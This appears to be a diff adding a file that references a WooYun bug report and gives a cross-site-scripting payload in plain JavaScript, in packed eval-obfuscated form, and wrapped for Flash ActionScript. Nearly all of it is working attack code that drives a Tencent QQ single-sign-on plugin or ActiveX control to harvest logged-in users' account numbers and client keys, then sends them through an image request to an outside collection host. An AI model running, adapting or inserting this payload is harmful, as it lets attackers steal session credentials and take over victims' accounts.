@@ -1,0 +1,52 @@
+Link -> http://www.wooyun.org/bugs/wooyun-2010-0194707
+
+
+原版JavaScript:
+var user_information='';
+    
+if (navigator.mimeTypes['application/nptxsso']) {  //  Chrome
+    var plug=document.createElement('embed');
+    plug.type='application/nptxsso';
+    document.body.appendChild(plug);
+    plug.InitPVA();
+    for (var user_index=0,user_count=plug.GetPVACount();user_index<user_count;++user_index) {
+        user_information+='Chrome=>uin:'+plug.GetUin(user_index)+' key:'+plug.GetST(user_index)+';';
+        console.log('Chrome=>uin:'+plug.GetUin(user_index)+' key:'+plug.GetST(user_index));
+    }
+} else {  //  IE
+    var plug=new ActiveXObject('SSOAxCtrlForPTLogin.SSOForPTLogin2');
+    var data=plug.CreateTXSSOData();
+    plug.InitSSOFPTCtrl(0,data);
+    var data_list=plug.DoOperation(1,data);
+    for (var user_list=data_list.GetArray('PTALIST'),user_index=0,user_count=plug.GetPVACount();user_index<user_count;++user_index) {
+        var user=user_list.GetData(user_index);
+        var client_key='';
+        for (var buffer=user.GetBuf('bufST_PTLOGIN'),read_index=0,read_count=user.GetSize();read_index<read_count;++read_index) {
+            var bit='0'+buffer.GetAt(read_index).toString('16');
+            client_key+=bit;
+        }
+        user_information+='IE=>uin:'+user.GetDWord('dwSSO_Account_dwAccountUin').toString()+' key:'+client_key+';';
+        console.log('IE=>uin:'+user.GetDWord('dwSSO_Account_dwAccountUin').toString()+' key:'+client_key);
+    }
+}
+
+var local_url=window.location.href;
+var local_cookie=/*'Cookie:'+document.cookie+*/' ClientKey:'+user_information;
+var local_ip='';//returnCitySN['cip'];
+var id=1;
+var url='http://easysmsattack.sinaapp.com/XSS_Get_Cookie/receive.php?current_cookie='+local_cookie+'&manage_id='+id+'&current_url='+local_url+'&current_ip='+local_ip;
+var img=document.createElement('img');
+img.src=url;
+document.body.appendChild(img);
+
+
+
+
+加密JavaScript:
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 9=\'\';K(P.Q[\'j/h\']){2 3=c.A(\'O\');3.M=\'j/h\';c.y.C(3);3.N();f(2 4=0,7=3.q();4<7;++4){9+=\'w=>8:\'+3.p(4)+\' a:\'+3.o(4)+\';\';u.n(\'w=>8:\'+3.p(4)+\' a:\'+3.o(4))}}V{2 3=T R(\'S.H\');2 g=3.G();3.F(0,g);2 k=3.I(1,g);f(2 r=k.J(\'W\'),4=0,7=3.q();4<7;++4){2 5=r.1a(4);2 6=\'\';f(2 v=5.19(\'1d\'),b=0,s=5.1g();b<s;++b){2 t=\'0\'+v.10(b).e(\'16\');6+=t}9+=\'i=>8:\'+5.m(\'l\').e()+\' a:\'+6+\';\';u.n(\'i=>8:\'+5.m(\'l\').e()+\' a:\'+6)}}2 E=13.12.14;2 B=\' 17:\'+9;2 x=\'\';2 D=1;2 z=\'15://Y.X.Z/11/1f.1e?18=\'+B+\'&1c=\'+D+\'&1b=\'+E+\'&L=\'+x;2 d=c.A(\'d\');d.U=z;c.y.C(d);',62,79,'||var|plug|user_index|user|client_key|user_count|uin|user_information|key|read_index|document|img|toString|for|data|nptxsso|IE|application|data_list|dwSSO_Account_dwAccountUin|GetDWord|log|GetST|GetUin|GetPVACount|user_list|read_count|bit|console|buffer|Chrome|local_ip|body|url|createElement|local_cookie|appendChild|id|local_url|InitSSOFPTCtrl|CreateTXSSOData|SSOForPTLogin2|DoOperation|GetArray|if|current_ip|type|InitPVA|embed|navigator|mimeTypes|ActiveXObject|SSOAxCtrlForPTLogin|new|src|else|PTALIST|sinaapp|easysmsattack|com|GetAt|XSS_Get_Cookie|location|window|href|http||ClientKey|current_cookie|GetBuf|GetData|current_url|manage_id|bufST_PTLOGIN|php|receive|GetSize'.split('|'),0,{}))
+
+
+
+
+转换到Action Script:
+ExternalInterface.call("eval","function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 9='';1h(I.H['w/t']){2 3=a.E('R');3.Q='w/t';a.A.D(3);3.U();g(2 4=0,b=3.k();4<b;++4){9+='C=>8:'+3.v(4)+' 7:'+3.F(4)+'\\n';o.m('C=>8:'+3.v(4)+' 7:'+3.F(4))}}T{2 3=M L('O.G');2 f=3.P();3.N(0,f);2 r=3.S(1,f);g(2 j=r.K('J'),4=0,b=3.k();4<b;++4){2 5=j.1b(4);2 d='';g(2 i=5.1c('1a'),6=0,l=5.18();6<l;++6){2 p='0'+i.19(6).e('16');d+=p};9+='s=>8:'+5.q('h').e()+' 7:'+d+'\\n';o.m('s=>8:'+5.q('h').e()+' 7:'+d)}};2 u=1d.1e.1f;2 z=' 17:'+9;2 y='';2 x=1;2 B='Z://X.V.W/10/14.15?13='+z+'&11='+x+'&12='+u+'&Y='+y;2 c=a.E('c');c.1g=B;a.A.D(c);',62,80,'||var|plug|user_index|user|read_index|key|uin|user_information|document|user_count|img|client_key|toString|data|for|dwSSO_Account_dwAccountUin|buffer|user_list|GetPVACount|read_count|log||console|bit|GetDWord|data_list|IE|nptxsso|local_url|GetUin|application|id|local_ip|local_cookie|body|url|Chrome|appendChild|createElement|GetST|SSOForPTLogin2|mimeTypes|navigator|PTALIST|GetArray|ActiveXObject|new|InitSSOFPTCtrl|SSOAxCtrlForPTLogin|CreateTXSSOData|type|embed|DoOperation|else|InitPVA|sinaapp|com|easysmsattack|current_ip|http|XSS_Get_Cookie|manage_id|current_url|current_cookie|receive|php||ClientKey|GetSize|GetAt|bufST_PTLOGIN|GetData|GetBuf|window|location|href|src|if'.split('|'),0,{});");
